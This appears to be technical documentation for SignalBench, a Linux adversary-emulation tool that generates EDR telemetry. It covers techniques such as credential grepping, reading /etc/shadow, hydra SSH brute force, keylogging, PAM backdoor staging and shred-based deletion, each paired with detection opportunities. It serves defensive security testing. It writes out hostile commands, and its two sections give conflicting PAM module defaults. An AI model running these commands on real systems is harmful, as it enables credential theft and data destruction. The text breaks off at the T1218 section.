# SignalBench - Technique Documentation

This document provides detailed information about each MITRE ATT&CK technique implemented in SignalBench, explaining how they work, what telemetry they generate, and what artefacts they create.

## Destructive operations & lockout risks (read first)

SignalBench exercises EDR/XDR telemetry by simulating attacker-class behaviour.
A handful of techniques perform writes that, if they went wrong, could lock an
operator out of the host.  After a real-world PAM Backdoor (T1556.003) incident
locked a test host out of every login path (SSH and console) by overwriting
`pam_unix.so` with a non-functional stub, the codebase added a defence-in-depth
chokepoint at `src/safety.rs::destructive_write`.

**Guarantees the safety chokepoint provides** (enforced at runtime, NOT overridable by `--force`):

- Signalbench will **never overwrite a real PAM module** (`pam_unix.so`,
  `pam_systemd.so`, etc.).  An explicit deny-list of ~45 real module names is
  consulted before any cp.
- Signalbench will **never overwrite a pre-existing file** under a protected
  directory (`/lib*/security/`, `/lib/systemd/system/`, `/boot/`, `/sbin/`,
  `/usr/sbin/`).
- Signalbench will **never overwrite** `/etc/passwd`, `/etc/shadow`,
  `/etc/group`, `/etc/sudoers`, or core PAM stacks (`/etc/pam.d/login`,
  `/etc/pam.d/common-*`, `/etc/pam.d/system-auth`).
- Cleanup will **never delete** a file at any of the paths above, even if a
  metadata file claims signalbench created it.  Cleanup that would touch a
  protected path logs `[REFUSED]` and leaves the file in place.

**Techniques that perform destructive system writes**:

| Technique | Writes to | Safety mechanism |
|---|---|---|
| T1556.003 PamBackdoor | `/lib*/security/<module>`, `/etc/pam.d/sshd` | Default `module_name=pam_signalbench_backdoor.so`; refuses any real PAM module name (deny-list); refuses to overwrite pre-existing files; `/etc/pam.d/sshd` backed up before append; cleanup never removes protected paths |
| T1098 AccountManipulation | `/etc/passwd` (via `usermod`), user groups, `~/.ssh/authorized_keys` | Default `test_username=signalbench_testuser`; refuses any username not prefixed `signalbench_` or `sb_`; refuses if username matches the invoking `$SUDO_USER` / `$USER` |
| T1136.001 LocalAccountCreation | `/etc/passwd`, sudo/wheel group | Refuses if target username already exists; cleanup `userdel`s only after a successful create within the same execute() |
| T1110.001 SSHBruteForce | `/etc/passwd` (test user only) | Hardcoded `signalbench_brute_test` username; cleanup gated by `user_created` flag in state file |
| T1548 SudoersModification | `/etc/sudoers.d/99-signalbench-test` | Validated with `visudo`; cleanup removes only the signalbench-named file |
| T1562.001 DisableSecurityTools | `pkill` against EDR process names | Hardcoded 11-name allow-list; cannot match `sshd`, `login`, `init`, or PAM-related processes |

**Pre-flight safety check** (`safety::check_environment`) warns about leftover state from a prior incomplete run:

- `/etc/pam.d/sshd.signalbench-backup*` files → previous PamBackdoor run did
  not complete cleanup; review `/etc/pam.d/sshd` for stray backdoor lines.
- `/tmp/signalbench_pam_*.so` files → leftover fake module.
- `/tmp/signalbench_pam_backdoor_*.json` files → stranded metadata.
- `pam_unix.so` missing from every PAM module directory → host authentication
  is broken; CRITICAL warning printed with the exact apt-get / dnf reinstall
  command to recover.

**Recovery procedure** if PamBackdoor ever locks a host out (should be impossible after the safety chokepoint landed; documented here for historical reference and bare-metal recovery):

```bash
# From rescue boot / single-user / out-of-band root console:
apt-get install --reinstall libpam-modules libpam0g libpam-runtime   # Debian/Ubuntu
dnf reinstall pam pam-libs                                           # RHEL/Fedora

# Clean any stray PamBackdoor lines from /etc/pam.d/sshd
grep -i signalbench /etc/pam.d/sshd
sed -i '/SIGNALBENCH-PAM-BACKDOOR/,+1d' /etc/pam.d/sshd
sed -i '\|signalbench_pam_.*\.so|d' /etc/pam.d/sshd

# Remove leftover /tmp artefacts
rm -f /tmp/signalbench_pam_*.so /tmp/signalbench_pam_backdoor_*.json

# Refresh dynamic linker cache
ldconfig
```

## Multi-Category Support

SignalBench supports executing multiple technique categories in a single command, enabling comprehensive telemetry generation across multiple tactics:

```bash
# Generate telemetry for techniques from multiple categories simultaneously
signalbench category discovery execution credential_access --dry-run

# Generate telemetry for all available categories for maximum coverage
signalbench category discovery execution credential_access defence_evasion privilege_escalation command_and_control exfiltration
```

This capability allows security teams to generate realistic telemetry patterns that span multiple tactics within the MITRE ATT&CK framework for analytics development and training scenarios.

## Important: Telemetry Generation Design

SignalBench executes actual OS commands that emulate technique-aligned activity patterns whilst remaining safe and non-destructive. This approach generates realistic endpoint telemetry for security analytics:

- Execute actual system commands to generate realistic telemetry
- Establish real network connections for network-based techniques
- Manipulate real files and processes on the system (within controlled parameters)
- Clean up after themselves to leave the system in its original state

This approach generates more realistic endpoint telemetry compared to simple simulations. When running these techniques in an environment with security products, generated signals may be observable depending on sensor configuration and coverage. Many modern security products are simulation-aware and may not generate alerts for research tools by design.

## Cleanup Behaviour and Debugging

By default, SignalBench automatically cleans up all artefacts after technique execution to leave the system in its original state. This ensures no files, directories, or configuration changes persist after telemetry generation.

For debugging and artefact analysis, you can preserve all artefacts using the `--no-cleanup` flag:

```bash
# Preserve artefacts for inspection
signalbench run T1059.004 --no-cleanup

# Preserve artefacts when running multiple categories
signalbench category discovery execution --no-cleanup
```

When `--no-cleanup` is used, SignalBench will:
- Skip all cleanup operations after technique execution
- Display the full list of preserved artefacts with their paths
- Leave files, directories, and configuration changes on disk for analysis

This is particularly useful for:
- Examining the exact artefacts generated by each technique
- Debugging technique implementations
- Analysing telemetry patterns in detail
- Training scenarios where artefact inspection is desired

## Force Mode (--force)

Force mode enables maximum telemetry generation by bypassing all environment pre-checks and running ALL available methods for each technique:

```bash
# Run single technique with force mode
signalbench run T1003.001 --force

# Run category with force mode
signalbench category credential_access --force

# ALL_CAPS meta-category (automatically enables force mode)
signalbench category ALL_CAPS
```

When force mode is enabled:
- All capability checks are bypassed (CAP_SYS_ADMIN, CAP_SYS_MODULE, etc.)
- Tools are attempted even when not found on PATH (attempt generates telemetry)
- Fallback patterns run BOTH primary AND secondary methods (e.g., gcore AND /proc/mem)
- Container escape techniques attempt all operations regardless of container detection
- File deletion runs shred AND wipe AND rm for maximum detection surface

Force mode is particularly useful because:
- Failed operations still generate detection telemetry (security products see the attempt)
- Maximum coverage testing regardless of environment conditions
- EDR/XDR evaluation with guaranteed signal generation

## ALL_CAPS Meta-Category

The ALL_CAPS meta-category runs ALL techniques across ALL categories with force mode automatically enabled:

```bash
signalbench category ALL_CAPS [--dry-run]
```

This is a tribute to MF DOOM (1971-2020) - "JUST REMEMBER ALL CAPS WHEN YOU SPELL THE MAN NAME"

Features:
- Executes every implemented technique in sequence
- Force mode is automatically enabled
- Maximum telemetry coverage in a single command
- Comprehensive security product evaluation

## Debug Mode (--debug)

Debug mode enables verbose logging without requiring environment variables:

```bash
signalbench run T1003.001 --debug
signalbench category discovery --debug
```

This replaces the need to set `RUST_LOG=debug` environment variable.

## Chain Execution Mode (--chain)

Chain mode builds a genuine parent/child process tree across a sequence of techniques. Each technique spawns the next as a child process rather than executing all techniques within the same process, producing realistic multi-stage process genealogy in endpoint telemetry.

Availability: `signalbench run` and `signalbench category` only. Not available in Voltron Mode.

```bash
# Chain a single technique (chain-of-one, still renames the process)
signalbench run T1003.001 --chain

# Chain all techniques in a category
signalbench category credential_access --chain

# Chain across multiple categories
signalbench category discovery credential_access execution --chain

# Combine with other flags
signalbench category discovery execution --chain --force --delay-cleanup 5
```

How it works:

1. The first process writes all queued TTP IDs to a session file at `/tmp/signalbench_chain_<uuid>.txt` and exports the path via the `SIGNALBENCH_CHAIN_FILE` environment variable.
2. The current process renames itself to the technique ID using `prctl(PR_SET_NAME)` (Linux), so it appears in `ps` and `pstree` under the TTP ID with dots replaced by dashes (e.g. `T1003-001`). The 15-character kernel limit applies; longer IDs are truncated.
3. After executing its technique, the process pops the next TTP ID from the chain file and spawns a child `signalbench` process with `argv[0]` set to the next TTP alias. All flags (`--dry-run`, `--no-cleanup`, `--force`, `--debug`, `--delay-cleanup`, `--config`) propagate to every child in the chain.
4. The child repeats this sequence, producing a process tree where each TTP is a direct child of the preceding one.
5. When the chain file is empty the last process deletes it. On SIGINT or SIGTERM the chain file is removed immediately to avoid orphaned state.
6. If any child process exits with a non-zero code the chain is aborted and the chain file is deleted.

This mode is intended for generating multi-stage attack telemetry where process lineage is meaningful to the detection use case. Single-technique runs still benefit from process renaming even when no chaining occurs.

## DISCOVERY Techniques

### T1082 - System Information Discovery

Description:  
Emulates system information discovery activities that generate telemetry patterns associated with reconnaissance behaviour.

How it works:
1. Executes various system information commands
2. Collects details about the operating system, hardware, kernel, and installed packages
3. Saves all gathered information to a log file for telemetry analysis
4. Concludes with a shell-driven recon batch (`uname -a; id; hostname; cat /etc/os-release; uptime; w`) executed through `/bin/sh -c` so the recon commands appear under a shell parent rather than directly under signalbench

Parameters:
- `output_file`: Path to save the system information
- `commands`: Comma-separated list of commands to run

Artefacts: 
- System information output file (cleaned up automatically after execution)

Observable patterns:
- Multiple system information commands executed in rapid succession
- Creation of files containing comprehensive system details
- A `/bin/sh -c` parent process invoking the canonical recon one-liner

### T1016 - System Network Configuration Discovery

Description:  
Executes REAL network configuration discovery commands to map out the target network.

How it works:
1. Runs various network configuration commands (ip addr, ip route, ifconfig, netstat)
2. Collects information about network interfaces, routing tables, and open ports
3. Creates a comprehensive log file of network information
4. Concludes with a shell-driven recon batch (`ip a; ip r; arp -an; ss -tunap; resolvectl status`) executed through `/bin/sh -c` so the commands appear under a shell parent process

Parameters:
- `output_file`: Path to save the network information
- `commands`: Comma-separated list of network commands to run

Artefacts:
- Network information output file (cleaned up automatically after execution)

Detection opportunities:
- Multiple network discovery commands in short succession
- Creation of files containing network configuration details
- A `/bin/sh -c` parent invoking the canonical network recon one-liner

### T1016 - DNS reconnaissance or enumeration via DNSRecon

Description:  
Creates and executes a benign DNS reconnaissance script to simulate enumeration of domain information.

How it works:
1. Creates a Python script named "signalbench-dnsrecon.py" in the /tmp directory
2. The script performs DNS lookups on common subdomains for a target domain
3. Results are logged to a file showing discovered DNS records
4. This is a simulated technique that doesn't use comprehensive scanning tools

Parameters:
- `target_domain`: Domain to target for reconnaissance (default: simonsigre.com)
- `output_file`: Path to save the reconnaissance results
- `subdomain_list`: List of subdomains to check (comma-separated)

Artefacts:
- Python DNS reconnaissance script (cleaned up automatically after execution)
- DNS scan results file (cleaned up automatically after execution)

Detection opportunities:
- Creation and execution of DNS query scripts
- Multiple DNS queries in rapid succession
- Pattern of subdomain enumeration activities

### T1046 - Network Service Discovery

Description:  
Executes REAL port scanning to identify open ports and running services on the target network.

How it works:
1. Creates a log file for scan results
2. For localhost targets, performs real (but safe) port checks on specified ports
3. For non-localhost targets, simulates port scanning results without actual network traffic
4. Documents open/closed ports and potential services running

Parameters:
- `target_hosts`: Target hosts to scan (comma-separated IPs or CIDR)
- `ports`: Ports to scan (e.g., 22,80,443 or 1-1000)
- `output_file`: Path to save scan results

Artefacts:
- Port scan results file (cleaned up automatically after execution)

Detection opportunities:
- Network monitoring tools can detect port scanning activity
- Multiple connection attempts to different ports in rapid succession

### T1049 - System Network Connections Discovery

Description:  
Executes network connection discovery commands to enumerate active connections, understand data flow, and identify potential lateral movement paths.

How it works:
1. Executes various connection-gathering commands (netstat, ss, lsof)
2. Logs all current network connections, listening ports, and associated processes
3. Creates a comprehensive network connections map
4. Concludes with a shell-driven recon batch (`ss -tunap; netstat -tunap; lsof -i | head -50`) executed through `/bin/sh -c` and piped, so the commands appear under a shell parent

Parameters:
- `output_file`: Path to save connection discovery results
- `commands`: Comma-separated list of commands to run for connection discovery

Artefacts:
- Network connections log file (cleaned up automatically after execution)

Detection opportunities:
- Process monitoring can detect network connection discovery commands
- Multiple network-related commands executed in sequence
- A `/bin/sh -c` parent invoking the canonical connection recon pipeline

## CREDENTIAL_ACCESS Techniques

### T1003.001 - Memory Dumping

Description:  
Executes REAL memory dumping techniques against running processes to extract credentials, replicating techniques used by attackers to steal passwords and tokens from memory.

How it works:
1. Attempts to attach to target process using ptrace/strace for memory access
2. Enumerates /proc/[pid]/maps to identify readable memory regions
3. Uses gcore (if available) to create process memory dumps
4. Reads directly from /proc/[pid]/mem using dd for memory extraction
5. Searches extracted memory for credential patterns (password, token, key, auth)
6. Creates session-specific dump directories with realistic artefacts

Parameters:
- `target_pid`: PID of process to dump memory from (0 = self)
- `dump_file`: Path to save the memory dump file

Artefacts: 
- Memory dump file (cleaned up automatically after execution)

Detection opportunities:
- Suspicious process accessing memory of other processes
- Reading of process memory files
- Creation of large memory dump files

### T1056.001 - Keylogging

Description:  
Executes REAL keylogging techniques by accessing input devices and capturing keyboard events to harvest credentials and sensitive information.

How it works:
1. Enumerates available input devices using xinput list and /dev/input
2. Attempts to read from keyboard device files for keystroke capture
3. Each `dd` reader is launched daemonised via `nohup ... &` from a short-lived shell: the spawning shell exits immediately, leaving `dd` reparented to init (PPID=1), which matches the orphaned-daemon pattern real keyloggers produce
4. Records captured keystrokes with timestamps in a log file
5. Identifies potential credentials in captured input patterns

Parameters:
- `log_file`: Path to save the keylogger output
- `duration`: Duration in seconds to run the keylogger

Artefacts:
- Keylogger log file (cleaned up automatically after execution)

Detection opportunities:
- Processes reading from keyboard device files
- Orphaned `dd` processes with PPID=1 reading `/dev/input/event*`
- File creation with credential-like content

### T1552.001 - Credentials in Files

Description:  
Harvesting hardcoded passwords, API tokens, or service credentials from config files (/etc/, .env).

How it works:
1. Creates test credential files with realistic content (.env, config.json, etc.)
2. Searches for credential patterns in configuration files
3. Simulates credential discovery and harvesting
4. After the in-process Regex sweep, runs three shell-driven `grep` invocations through `/bin/sh -c` against `/etc /home /root` for distinctive DLP patterns (AWS access keys matching `AKIA[0-9A-Z]{16}` and `aws_secret_access_key`; PEM and OpenSSH private key headers; and JDBC, MongoDB, PostgreSQL, MySQL connection strings). Output is staged at `/tmp/signalbench_dlp_*.txt`. Each grep runs under `timeout 30` to bound runtime.
5. Reports findings in detailed logs

Parameters:
- `search_paths`: Paths to search for credential files
- `file_patterns`: File patterns to search for credentials
- `output_file`: File to save discovered credentials

Artefacts:
- Test credential files (cleaned up automatically after execution)
- Credential discovery logs (cleaned up automatically after execution)
- DLP grep stage files at `/tmp/signalbench_dlp_*` (cleaned up automatically)

Detection opportunities:
- Monitor for processes accessing configuration files
- Unusual file access patterns
- Credential harvesting tools
- `grep` child processes against `/etc`, `/home`, or `/root` with AWS key, private-key header, or database connection-string regex in argv

### T1003.007 - OS Credential Dumping: Proc Filesystem

Description:  
Uses dd utility and /proc filesystem to analyse process memory for credential patterns, simulating memory dumping techniques commonly used to extract credentials from running processes.

How it works:
1. Enumerates running processes from /proc directory targeting common applications (firefox, chrome, ssh, sshd, apache2, nginx)
2. Reads memory maps from /proc/<PID>/maps to identify readable memory regions  
3. Uses dd utility to extract memory segments from /proc/<PID>/mem files
4. Searches extracted memory for credential patterns (password, token, key, auth, credential)
5. Logs all analysis activities and findings for telemetry generation
6. Creates session-specific dump directories for realistic artifact simulation

Parameters:
- `target_processes`: Comma-separated list of process names to target (default: firefox,chrome,ssh,sshd,apache2,nginx)
- `memory_dump_size`: Size of memory to extract per process in bytes (default: 4096)
- `max_processes`: Maximum number of processes to analyse (default: 5)
- `log_file`: Path to save detailed analysis logs (default: /tmp/signalbench_proc_dump.log)
- `search_patterns`: Credential patterns to search for (default: password,token,key,auth,credential)

Artefacts:
- Process memory dump files in session directory (cleaned up automatically after execution)
- Detailed analysis log file with enumeration and search results (cleaned up automatically after execution)
- Session-specific dump directory with unique identifier (cleaned up automatically after execution)

Detection opportunities:
- Monitor dd command usage on /proc/<PID>/mem files
- Excessive /proc filesystem access patterns
- Memory mapping enumeration activities
- Process memory analysis and credential extraction attempts
- Creation of memory dump files in temporary directories

### T1110.002 - SSH Brute Force

Description:  
Performs real SSH brute-force authentication attempts against the configured target. When running as root the technique creates a temporary local test user; otherwise it brute-forces existing accounts. Attempts rotate through realistic service-account usernames so the failed-auth pattern in `/var/log/auth.log` matches what a Hydra/Medusa run produces, and a hydra invocation is attempted when the binary is present so the tool name appears in argv.

How it works:
1. When running as root, creates a temporary test user via `useradd`/`chpasswd` for a safe baseline attempt
2. Builds a username rotation: the test user followed by `root`, `admin`, `postgres`, `oracle`, `git`, `deploy`, `ubuntu`, `test`. Each attempt picks the next username in the rotation so the auth-log shows attempts spread across multiple service accounts (the canonical brute-force signature) rather than concentrated on one user.
3. For each attempt, invokes `sshpass -p <password> ssh ... <user>@<host>` (or falls back to direct `ssh` when `sshpass` is unavailable). Records response timing for timing-attack analysis.
4. Paces attempts at ~10/s (100ms between attempts) so the burst rate matches the SSH brute-force signatures Snort and Cortex correlation rules key on.
5. When `hydra` is on PATH, stages a username list and a password list under `/tmp/.cache_*_<session>` and invokes `hydra -L <users> -P <passwords> -t 4 -f -o ... -s <port> <host> ssh`. The `hydra` argv entry is the high-value tool fingerprint regardless of whether the attempt succeeds.
6. On root, cleans up the temporary test user with `userdel -r`. Stage files for hydra are removed after the invocation.

Parameters:
- `target_host`: Target SSH host (default: localhost)
- `target_port`: Target SSH port (default: 22)
- `attempt_count`: Number of sshpass attempts in the 5-10 range (default: 8)

Artefacts:
- Brute force attempt log under `/tmp/signalbench_brute_force_<session>.log` (cleaned up automatically)
- Artifacts JSON under `/tmp/signalbench_brute_force_<session>_artifacts.json` (cleaned up automatically)
- Temporary test user (when root) removed via `userdel -r` on cleanup

Detection opportunities:
- Rapid sequential SSH authentication failures from a single source against multiple usernames (canonical brute-force signature)
- `sshpass` binary execution
- `hydra` binary execution with `-L`/`-P`/`-t` arguments
- Failed auth log entries naming common service accounts (`root`, `admin`, `postgres`, `oracle`, `git`, `deploy`, `ubuntu`, `test`) in close succession from the same source
- Burst-rate authentication attempts (multiple per second) against SSH

### T1003.008 - /etc/passwd and /etc/shadow

Description:  
Performs REAL extraction and analysis of /etc/passwd and /etc/shadow files to harvest user account information and password hashes. This technique reads actual system files and attempts password hash cracking whilst remaining 100% safe and non-destructive.

How it works:
1. Reads REAL /etc/passwd file to enumerate all user accounts
2. Attempts to read /etc/shadow (requires root or sudo) to extract password hashes
3. Parses user account entries to extract:
   - Usernames
   - User IDs (UIDs)
   - Group IDs (GIDs)
   - Home directories
   - Login shells
   - GECOS fields (full names, contact info)
4. Identifies privileged accounts (UID 0, sudo group members)
5. Extracts password hashes from /etc/shadow for analysis:
   - SHA-512 hashes ($6$)
   - SHA-256 hashes ($5$)
   - MD5 hashes ($1$)
   - Blowfish hashes ($2a$, $2y$)
6. Simulates password cracking attempts using john or hashcat against extracted hashes
7. Creates comprehensive user enumeration reports
8. Identifies accounts with empty passwords or no passwords set
9. Maps users to their group memberships via /etc/group
10. Generates statistics on password hash algorithms and strengths

Parameters:
- `attempt_shadow_read`: Whether to attempt reading /etc/shadow (default: true)
- `crack_hashes`: Whether to simulate password cracking (default: true)
- `wordlist`: Path to wordlist for password cracking simulation (default: common passwords)
- `output_format`: Output format for results - text, json, csv (default: text)
- `enumerate_groups`: Whether to enumerate group memberships (default: true)

Artefacts:
- User enumeration report file (cleaned up automatically after execution)
- Extracted password hashes file (cleaned up automatically)
- Password cracking results (cleaned up automatically)
- Group membership mapping file (cleaned up automatically)

Detection opportunities:
- Monitor access to /etc/passwd and /etc/shadow files
- Detect reading of /etc/shadow by non-root processes
- Watch for grep/awk/sed commands parsing passwd/shadow files
- Monitor execution of password cracking tools (john, hashcat)
- Detect attempts to copy /etc/shadow to temporary directories
- File access patterns indicating user enumeration
- Unusual processes reading authentication-related files
- Sudo commands attempting to access /etc/shadow
- `cat /etc/passwd` and `cat /etc/shadow` invoked under a `/bin/sh -c` parent with stdout redirected to `/tmp/signalbench_passwd_stage_*` and `/tmp/signalbench_shadow_stage_*` (staging phase 2b - the cat exec on `/etc/shadow` plus the redirect to a staging path is the high-severity signature)
- `grep -E '^(root|admin|sudo):' /etc/shadow` chained from the same shell phase, staging the privileged entries to `/tmp/signalbench_passwd_shadow_priv_*`

### T1556.003 - PAM Backdoor

Description:
Simulates the post-XZ Utils (CVE-2024-3094) PAM backdoor TTP that became widely deployed in 2024-2025.  Real attackers replace the system `pam_unix.so` with a malicious build that hooks `pam_sm_authenticate` and `pam_get_authtok` to log credentials in cleartext, then add an `auth sufficient <module.so>` line to `/etc/pam.d/sshd` so the backdoor is consulted ahead of the real `pam_unix`.  This technique reproduces the syscall trace -- writes, copies, ldconfig invocation, PAM config modification -- without delivering a working backdoor.

How it works:
1. Writes a minimal ELF64-shaped binary blob to `/tmp/signalbench_pam_<session>.so` containing the same exported-symbol strings a real PAM module would (`pam_sm_authenticate`, `pam_get_authtok`, `pam_sm_setcred`, `pam_get_user`) so `file(1)` and `strings` analysis classifies it realistically.
2. Attempts to copy the fake module into every standard PAM module directory:
   - `/lib/security/`
   - `/lib/x86_64-linux-gnu/security/`
   - `/lib64/security/`
   - `/usr/lib/security/`
   Without root every `cp` call fails with `EACCES` -- the failed `openat()` / `write()` syscalls against PAM directories are the EDR signal regardless of outcome.
3. If running as root, backs up `/etc/pam.d/sshd` (or the configured `pam_file`) to `/tmp/signalbench_pam_backup_<session>.bak` and appends an `auth sufficient <fake.so>` line under a `# SIGNALBENCH-PAM-BACKDOOR-<session>` marker.
4. If not root, performs a read-only probe of the PAM config so the `open()` syscall is still captured.
5. Invokes `ldconfig` so the dynamic linker cache flush -- the canonical follow-on signal real attackers emit after dropping a module -- is on the wire.
6. Persists artifact metadata to `/tmp/signalbench_pam_backdoor_<session>.json` for cleanup.

Parameters:
- `pam_file`: PAM configuration file to back up and modify (default `/etc/pam.d/sshd`)
- `module_name`: Filename for the fake PAM module (default `pam_unix.so` to mimic the real glibc-bundled module)

Artefacts:
- Fake `.so` module at `/tmp/signalbench_pam_<session>.so` (removed at cleanup)
- Backup of PAM config at `/tmp/signalbench_pam_backup_<session>.bak` (removed at cleanup, contents restored to original location first)
- Any successful copies into `/lib*/security/` directories (removed at cleanup)
- Metadata JSON at `/tmp/signalbench_pam_backdoor_<session>.json`

Detection opportunities:
- Write syscalls to `/etc/pam.d/*` from non-package-manager processes
- Creation of `.so` files in `/lib/security/`, `/lib/x86_64-linux-gnu/security/`, or `/lib64/security/`
- `ldconfig` invocations not parented by a package manager or systemd
- New `auth` / `account` / `password` / `session` lines in PAM configurations that reference module paths outside `/lib*/security/`
- `cp` operations targeting `/lib*/security/` from user processes
- File integrity monitoring alerts on `pam_unix.so` modification
- These signals were heavily exercised by EDR vendors throughout 2024-2025 following the XZ Utils backdoor disclosure -- detection coverage is mature.

## DEFENSE_EVASION Techniques

### T1027 - Obfuscated Files or Information

Description:  
Employs various obfuscation techniques to evade detection mechanisms and hide malicious content.

How it works:
1. Implements multiple obfuscation methods:
   - Base64 encoding/decoding
   - XOR encryption with custom keys
   - Text string manipulation and concatenation
   - Binary packing/compression
   - Script obfuscation techniques
2. Creates obfuscated files and demonstrates deobfuscation
3. Executes deobfuscated content to trigger detection
4. Logs all obfuscation operations for review

Parameters:
- `obfuscation_type`: Type of obfuscation to perform (encoding, encryption, packing, string)
- `output_dir`: Directory to save obfuscated files
- `log_file`: Path to save obfuscation log
- `execute_after`: Whether to attempt execution of obfuscated files

Artefacts:
- Obfuscated files (cleaned up automatically after execution)
- Deobfuscated files (cleaned up automatically)
- Obfuscation log file (cleaned up automatically)

Detection opportunities:
- Files containing encoded/obfuscated content
- Use of encoding/decoding functions
- Execution of decoded content
- Suspicious patterns in obfuscated files

### T1055 - Process Injection

Description:  
Injects code into running processes to evade detection and execute malicious code in the context of legitimate processes.

How it works:
1. Supports multiple injection techniques:
   - Ptrace-based code injection
   - LD_PRELOAD dynamic library loading
   - Shared library injection
2. Creates actual C code for injection
3. Compiles injection code on the target system
4. Performs real (but controlled) process injection
5. Logs all injection attempts and results

Parameters:
- `technique`: Specific injection technique (ptrace, ld_preload, shared_library)
- `target_process`: Target process name or PID (for ptrace)
- `output_dir`: Directory to save injection artefacts
- `log_file`: Path to save injection log

Artefacts:
- Injection source code files (cleaned up automatically)
- Compiled injection binaries (cleaned up automatically)
- Injected libraries (cleaned up automatically)
- Target process scripts (cleaned up automatically)
- Injection logs (cleaned up automatically)

Detection opportunities:
- Suspicious ptrace calls
- LD_PRELOAD manipulations
- Creation of shared libraries
- Process memory modifications
- Unusual process relationships

### T1562.002 - Disable Linux Audit Logs

Description:  
Executes REAL audit log manipulation commands to disable or interfere with system logging.

How it works:
1. Creates a file that simulates rules to disable Linux audit logging
2. Contains rules that would disable key system call auditing in a real attack
3. Does not actually modify system audit configuration

Parameters:
- `audit_rules_file`: Path to save the simulated audit rules

Artefacts:
- Audit rules file (cleaned up automatically after execution)

Detection opportunities:
- Modification of audit configuration files
- Commands that disable audit functionality

### T1070.003 - Clear Command History

Description:  
Executes REAL bash history clearing commands to remove evidence of attacker activity.

How it works:
1. Creates a backup of the current user's bash history
2. Simulates clearing the history by creating an empty file
3. Restores the original history during cleanup

Parameters:
- `history_backup`: Path to save the backup of bash history

Artefacts:
- History backup file (cleaned up automatically after execution)

Detection opportunities:
- Unusual modifications to history files
- Commands that clear or manipulate bash history

### T1574.007 - Path Interception

Description:  
Executes REAL PATH interception by modifying environment variables to control which binaries are executed.

How it works:
1. Documents current PATH and LD_LIBRARY_PATH variables
2. Creates trojan wrapper scripts in the hijack directory for ls, ps, whoami, sudo, ssh, curl, and wget. Each wrapper logs the invocation then chains to the real binary by absolute path.
3. Invokes the hijacked commands through a PATH-modified shell: `/bin/sh -c "export PATH=<hijack_dir>:$PATH; ls -la /tmp; ps aux; whoami; sudo -n true; ssh -V; curl --version; wget --version"`. The trojan wrappers run because they precede the real binaries in PATH, producing the canonical PATH-hijack process tree (shell -> trojan -> real binary).
4. Creates a log file showing how a legitimate command could be intercepted

Parameters:
- `custom_path`: Directory to add to PATH variable
- `env_log_file`: Path to save the log file

Artefacts:
- Environment variable log file (cleaned up automatically after execution)
- Trojan wrapper scripts in the hijack directory (cleaned up automatically after execution)

Detection opportunities:
- Unusual modifications to PATH or LD_LIBRARY_PATH
- Creation of executable files in non-standard locations
- Common system commands (ls, ps, whoami, sudo, ssh, curl, wget) being executed from `/tmp` rather than `/bin` or `/usr/bin`
- A `/bin/sh -c` parent that exports PATH then runs multiple system commands in sequence

### T1036.003 - Masquerading

Description:  
Performs REAL process masquerading by compiling short C binaries that rename themselves at runtime via `prctl(PR_SET_NAME)` to appear in `ps` as legitimate system processes. Each masqueraded process then performs activity a real kernel worker or system daemon would not - writing to a stage file and opening a TCP socket - so the detection signal goes beyond a strange `ps` row.

How it works:
1. Compiles short C source files (one per masquerade target) that call `prctl(PR_SET_NAME)` with the spoofed name, then perform file and network activity to break the kernel-thread invariants
2. Runs three masqueraded children in parallel: `[kworker/0:0]`, `systemd-journald`, and `crond`
3. Each masqueraded child writes a stage file (`/tmp/signalbench_masquerade_*/.stage-*`) and opens a non-blocking TCP socket to the sinkhole on port 80. A real `[kworker]` thread does not open user-space sockets - this is the strong behavioural signal.
4. Verifies that `ps aux` shows the spoofed names
5. Restores the original process name on completion

Parameters:
- None at runtime; targets and durations are fixed

Artefacts:
- Compiled masquerade binaries and C sources under `/tmp/signalbench_masquerade_<uuid>/` (cleaned up automatically)
- Stage files written by each masqueraded child (cleaned up automatically)
- PIDs of running masqueraded children, tracked for cleanup

Detection opportunities:
- `prctl(PR_SET_NAME)` syscalls renaming a process to `[kworker/...]`, `systemd-journald`, or `crond`
- Processes named `[kworker/0:0]` opening user-space TCP sockets or writing to user paths under `/tmp` (kernel workers never do this)
- `ps aux` showing kernel-thread names attached to binaries executed from `/tmp`
- Outbound TCP SYN to the sinkhole on port 80 from a process appearing as a kernel worker
- Process name mismatches with expected execution paths and binary hashes
- Command-line manipulation patterns using exec -a

### T1070.004 - File Deletion

Description:  
Performs REAL secure file deletion using multiple overwriting techniques to simulate evidence destruction and anti-forensics activities. This technique uses actual deletion tools (shred, wipe, srm) whilst maintaining 100% safety by only deleting test files.

How it works:
1. Creates test files with realistic sensitive content (credentials, logs, database dumps)
2. Implements REAL secure deletion using multiple methods:
   - shred -vfz -n 10 (10-pass overwrite with zeros)
   - wipe -rf (Gutmann 35-pass secure deletion)
   - srm -v (OpenBSD secure rm implementation)
   - dd if=/dev/urandom of=<file> bs=1M (random data overwriting)
3. Tests deletion permanence by attempting file recovery
4. Removes file system metadata using sync and directory cache clearing
5. Performs multi-pass overwrites with different patterns:
   - Random data (from /dev/urandom)
   - Zeros (0x00)
   - Ones (0xFF)
   - DOD 5220.22-M standard patterns
6. Verifies secure deletion by checking file inode status
7. Tests different file types: text logs, binary databases, archive files
8. Simulates timeline manipulation by touching files before deletion

Parameters:
- `deletion_method`: Secure deletion tool to use - shred, wipe, srm, dd (default: shred)
- `overwrite_passes`: Number of overwrite passes (default: 10)
- `test_file_count`: Number of test files to create and delete (default: 5)
- `file_sizes`: Comma-separated list of file sizes in MB (default: 1,5,10)
- `verify_deletion`: Whether to attempt file recovery verification (default: true)

Artefacts:
- Test files created for deletion testing (cleaned up through secure deletion)
- Deletion operation logs (cleaned up automatically after execution)
- Overwrite verification files (cleaned up automatically)

Detection opportunities:
- Monitor execution of secure deletion tools (shred, wipe, srm, secure-delete)
- Detect multiple write operations to same file (overwrite patterns)
- Watch for dd commands with /dev/urandom or /dev/zero as input
- Unusual file I/O patterns (repeated writes to same file location)
- Process behaviour indicating anti-forensics activities
- File deletion operations on sensitive file types (logs, databases, archives)
- Timeline manipulation attempts (touch, utimes system calls)

### T1218 - LOLBin Proxy Execution (Linux)

Description:
Executes a curated set of LOLBin (Living Off the Land Binary) abuse patterns that spawn child processes from binaries that parent-process heuristics do not expect to fork shells.  Whereas `T1548-GTFOBINS` only probes the system to enumerate exploitable binaries, this technique actually executes the abuse patterns so EDR parent-process and unusual-child-spawn rules fire.  All child commands are read-only (`id`, `hostname`) -- the TTP signal is the fork+exec anomaly itself, not the command output.

How it works:
